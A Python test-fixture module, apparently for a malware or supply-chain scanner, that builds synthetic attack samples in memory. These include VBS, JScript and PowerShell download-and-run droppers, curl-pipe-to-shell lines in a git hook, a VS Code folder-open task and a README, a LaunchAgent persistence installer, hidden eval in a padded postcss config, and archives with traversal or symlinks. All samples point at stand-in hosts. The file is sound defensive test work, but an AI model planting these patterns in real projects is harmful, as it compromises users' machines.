"""Build synthetic targets in memory for the tests.

No malicious file ever lands on disk with a dangerous extension. Dropper and
obfuscation shapes are assembled here from fragments at call time, so the
dangerous token never sits contiguously in this source file either. Hosts are
under the reserved .invalid TLD and IPs are from the documentation ranges, so
nothing here points at a live resource.
"""

from __future__ import annotations

import io
import struct
import tarfile
import zipfile
import zlib

# A valid tiny PNG: signature, a minimal IHDR, and IEND. Not an image anyone
# would open, but the magic and structure are real.
PNG = (
    b"\x89PNG\r\n\x1a\n"
    b"\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
    b"\x00\x00\x00\x00IEND\xaeB`\x82"
)
PDF = b"%PDF-1.4\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n"

HOST = "stage.cdn.example.invalid"
URL = "http://stage.cdn.example.invalid/payload"
IP = "203.0.113.17"


# ---------------------------------------------------------------------------
# Shape builders (strings assembled from fragments)
# ---------------------------------------------------------------------------


def vbs_dropper(url: str = URL) -> str:
    """A Windows-script download, write and run chain, as text."""

    download = 'Set h = CreateObject("WinHttp.Win' + 'HttpRequest.5.1")'
    getline = 'h.Open "GET", "' + url + '", False' + "\n" + "h.Send"
    write = 'Set s = CreateObject("ADODB.Str' + 'eam")\ns.Save' + 'ToFile "%TEMP%\\stage.bat", 2'
    run = 'CreateObject("WScript.Sh' + 'ell").R' + 'un "%TEMP%\\stage.bat", 0'
    return "\n".join([download, getline, write, run]) + "\n"


def postcss_offscreen(rpc_host: str = "rpc.example.invalid") -> str:
    """A real postcss config whose line continues, far off-screen, into an
    eval of a decoded string and a blockchain lookup used as a channel."""

    real = "const config = { plugins: { 'autoprefixer': {} } };"
    pad = " " * 400
    decode = "at" + "ob('ZXZpbA==')"
    exec_call = "ev" + "al(" + decode + ")"
    rpc = (
        "fetch('https://" + rpc_host + "', {method:'POST', body: JSON.stringify("
        "{jsonrpc:'2.0', method:'eth_" + "call', params:[]})})"
    )
    tail = exec_call + "; " + rpc + ";"
    return real + pad + tail + "\nmodule.exports = config;\n"


def git_hook_background(url: str = URL) -> str:
    """A post-checkout hook that fetches and runs a payload in the background."""

    fetch = "cu" + "rl -sL " + url
    pipe = fetch + " | ba" + "sh &"
    return "#!/bin/sh\n" + pipe + "\n"


def installer_with_persistence(url: str = URL) -> str:
    """A shell installer that pipes a download into a shell and installs a
    launch agent for persistence."""

    fetch = "cu" + "rl -fsSL " + url + "/install"
    pipe = fetch + " | s" + "h"
    plist = 'cat > "$HOME/Library/LaunchAgents/com.example.helper.plist" <<EOF\nEOF'
    load = "launch" + 'ctl load "$HOME/Library/LaunchAgents/com.example.helper.plist"'
    return "#!/bin/bash\n" + pipe + "\n" + plist + "\n" + load + "\n"


def readme_curl_install(url: str = URL) -> str:
    fetch = "cu" + "rl -fsSL " + url + "/install"
    pipe = fetch + " | s" + "h"
    return "# Setup\n\nRun this to install:\n\n```bash\n" + pipe + "\n```\n"


def vscode_task_folder_open(url: str = URL) -> str:
    """A .vscode/tasks.json (JSONC) with a task that runs on folder open."""

    fetch = "cu" + "rl -sL " + url
    pipe = fetch + " | s" + "h"
    return (
        "{\n"
        "  // runs on open\n"
        '  "version": "2.0.0",\n'
        '  "tasks": [\n'
        "    {\n"
        '      "label": "setup",\n'
        '      "type": "shell",\n'
        f'      "command": "{pipe}",\n'
        '      "runOptions": { "runOn": "folderOpen" },\n'
        "    },\n"
        "  ],\n"
        "}\n"
    )


def vscode_task_build() -> str:
    return (
        "{\n"
        '  "version": "2.0.0",\n'
        '  "tasks": [\n'
        "    {\n"
        '      "label": "build",\n'
        '      "type": "shell",\n'
        '      "command": "npm run build",\n'
        "    },\n"
        "  ],\n"
        "}\n"
    )


def python_decoded_exec() -> str:
    """A Python module-level call that runs a decoded blob, built from fragments."""

    decode = "ba" + "se64.b64" + "decode('cHJpbnQ=')"
    primitive = "ex" + "ec(" + decode + ")"
    return "import base64\n" + primitive + "\n"


# ---------------------------------------------------------------------------
# Archive builders
# ---------------------------------------------------------------------------


def make_zip(
    members: dict[str, bytes], *, encrypt: tuple[str, ...] = (), stored: bool = False
) -> bytes:
    """A zip of the members. ``stored`` skips compression, for content so
    repetitive that deflate would trip the compression-ratio cap."""

    buf = io.BytesIO()
    method = zipfile.ZIP_STORED if stored else zipfile.ZIP_DEFLATED
    with zipfile.ZipFile(buf, "w", method) as archive:
        for name, data in members.items():
            archive.writestr(name, data)
    raw = buf.getvalue()
    for name in encrypt:
        raw = _set_encrypted_flag(raw, name)
    return raw


def make_zip_with_symlink(members: dict[str, bytes], link_name: str, target: str) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as archive:
        for name, data in members.items():
            archive.writestr(name, data)
        info = zipfile.ZipInfo(link_name)
        info.create_system = 3  # unix
        info.external_attr = (0o120777 & 0xFFFF) << 16  # S_IFLNK
        archive.writestr(info, target)
    return buf.getvalue()


def make_zip_traversal(name: str, data: bytes) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as archive:
        archive.writestr(name, data)
    return buf.getvalue()


def _set_encrypted_flag(raw: bytes, member: str) -> bytes:
    data = bytearray(raw)
    target = member.encode("utf-8")
    pos = 0
    sig = b"PK\x01\x02"
    while True:
        at = data.find(sig, pos)
        if at < 0:
            break
        name_len = struct.unpack_from("<H", data, at + 28)[0]
        name = bytes(data[at + 46 : at + 46 + name_len])
        if name == target:
            flags = struct.unpack_from("<H", data, at + 8)[0]
            struct.pack_into("<H", data, at + 8, flags | 0x0001)
            local_off = struct.unpack_from("<I", data, at + 42)[0]
            if data[local_off : local_off + 4] == b"PK\x03\x04":
                lflags = struct.unpack_from("<H", data, local_off + 6)[0]
                struct.pack_into("<H", data, local_off + 6, lflags | 0x0001)
        pos = at + 46
    return bytes(data)


# ---- RAR5 writer (stored, no compression) --------------------------------


def _vint(value: int) -> bytes:
    out = bytearray()
    while True:
        byte = value & 0x7F
        value >>= 7
        if value:
            out.append(byte | 0x80)
        else:
            out.append(byte)
            return bytes(out)


_RAR5_SIGNATURE = b"Rar!\x1a\x07\x01\x00"
_HFLAG_EXTRA = 0x0001
_HFLAG_DATA = 0x0002
_FFLAG_DIR = 0x0001
_FFLAG_CRC = 0x0004


def _rar_block(
    htype: int,
    type_specific: bytes,
    *,
    extra: bytes = b"",
    data: bytes = b"",
    has_data: bool = False,
) -> bytes:
    flags = 0
    if extra:
        flags |= _HFLAG_EXTRA
    if data or has_data:
        flags |= _HFLAG_DATA
    inner = bytearray()
    inner += _vint(htype)
    inner += _vint(flags)
    if flags & _HFLAG_EXTRA:
        inner += _vint(len(extra))
    if flags & _HFLAG_DATA:
        inner += _vint(len(data))
    inner += type_specific
    inner += extra
    header_size = _vint(len(inner))
    crc = zlib.crc32(header_size + bytes(inner)) & 0xFFFFFFFF
    return struct.pack("<I", crc) + header_size + bytes(inner) + data


def make_rar5(
    members: dict[str, bytes], *, links: dict[str, tuple[str, int]] | None = None
) -> bytes:
    """A stored RAR5. ``links`` maps a member name to ``(target, redirect type)``,
    1 for a Unix symlink and 4 for a hard link, written as a redirection record."""

    links = links or {}
    out = bytearray(_RAR5_SIGNATURE)
    out += _rar_block(1, _vint(0))  # main header, archive flags 0
    for name, content in members.items():
        name_bytes = name.encode("utf-8")
        is_dir = name.endswith("/")
        file_flags = _FFLAG_DIR if is_dir else _FFLAG_CRC
        type_specific = bytearray()
        type_specific += _vint(file_flags)
        type_specific += _vint(0 if is_dir else len(content))  # unpacked size
        type_specific += _vint(0)  # attributes
        if not is_dir:
            type_specific += struct.pack("<I", zlib.crc32(content) & 0xFFFFFFFF)
        type_specific += _vint(0)  # compression info (version 0, stored)
        type_specific += _vint(0)  # host OS (Windows)
        type_specific += _vint(len(name_bytes))
        type_specific += name_bytes
        data = b"" if is_dir else content
        extra = b""
        if name in links:
            target, redirect_type = links[name]
            target_bytes = target.encode("utf-8")
            record = _vint(0x05) + _vint(redirect_type) + _vint(0)
            record += _vint(len(target_bytes)) + target_bytes
            extra = _vint(len(record)) + record
        out += _rar_block(2, bytes(type_specific), extra=extra, data=data, has_data=not is_dir)
    out += _rar_block(5, _vint(0))  # end of archive
    return bytes(out)


def make_rar5_encrypted_headers() -> bytes:
    out = bytearray(_RAR5_SIGNATURE)
    enc_body = _vint(0) + _vint(0) + bytes([15]) + (b"\x00" * 16)  # version, flags, kdf, salt
    out += _rar_block(4, bytes(enc_body))
    out += b"\x00" * 32  # encrypted bytes follow; reader stops at the encryption header
    return bytes(out)


def make_tar(
    members: dict[str, bytes],
    *,
    symlinks: dict[str, str] | None = None,
    hardlinks: dict[str, str] | None = None,
) -> bytes:
    """A gzip-compressed tar with regular members and link members."""

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, data in members.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
        for name, target in (symlinks or {}).items():
            info = tarfile.TarInfo(name)
            info.type = tarfile.SYMTYPE
            info.linkname = target
            tar.addfile(info)
        for name, target in (hardlinks or {}).items():
            info = tarfile.TarInfo(name)
            info.type = tarfile.LNKTYPE
            info.linkname = target
            tar.addfile(info)
    return buf.getvalue()


# ---------------------------------------------------------------------------
# Windows-script shapes for GH201/GH202, assembled from fragments
# ---------------------------------------------------------------------------


def ps_download_run(url: str = URL) -> str:
    """A PowerShell line that fetches a script and runs it in memory."""

    fetch = "(New-Object Net.Web" + "Client).Download" + f"String('{url}')"
    return "IE" + "X " + fetch + "\n"


def wsh_jscript_dropper(url: str = URL) -> str:
    """A JScript Windows Script Host download, write and run chain."""

    get = (
        "var h = new Active"
        + "XObject('MSXML2.XML"
        + f"HTTP'); h.open('GET','{url}',false); h.send();\n"
    )
    save = (
        "var s = new Active" + "XObject('ADODB.Str" + "eam'); s.Open(); s.Type=1; "
        "s.Write(h.responseBody); s.Save" + "ToFile('C:\\\\Users\\\\Public\\\\p.exe',2);\n"
    )
    run = (
        "new Active"
        + "XObject('WScript.Sh"
        + "ell').R"
        + "un('C:\\\\Users\\\\Public\\\\p.exe',0);\n"
    )
    return get + save + run


def wsh_jscript_signal() -> str:
    """A JScript file that only uses a Windows Script Host object, no download."""

    return "var sh = new Active" + "XObject('WScript.Sh" + "ell'); sh.R" + "un('calc');\n"


def bat_single_step(url: str = URL) -> str:
    """A .bat with one download step and nothing else (a GH202 review)."""

    return "cu" + "rl -fsSL " + url + " -o %TEMP%\\p.bin\r\n"


def mvnw_cmd(url: str = URL) -> str:
    """A Maven wrapper .cmd shape: a PowerShell download of the wrapper jar."""

    dl = (
        'powershell -Command "(New-Object Net.Web'
        + "Client).Download"
        + f"File('{url}/maven-wrapper.jar', $env:WRAPPER_JAR)\"\r\n"
    )
    return "@REM Maven Wrapper startup\r\n@echo off\r\n" + dl + "java -jar %WRAPPER_JAR% %*\r\n"


def gradlew_bat() -> str:
    """The real Gradle wrapper .bat opening, which is benign."""

    return (
        "@rem Gradle startup script for Windows\r\n@echo off\r\n"
        "set DIRNAME=%~dp0\r\nset APP_BASE_NAME=%~n0\r\n"
        '"%JAVA_EXE%" %DEFAULT_JVM_OPTS% -classpath "%CLASSPATH%" '
        "org.gradle.wrapper.GradleWrapperMain %*\r\n"
        ":execute\r\nexit /b 1\r\n"
    )
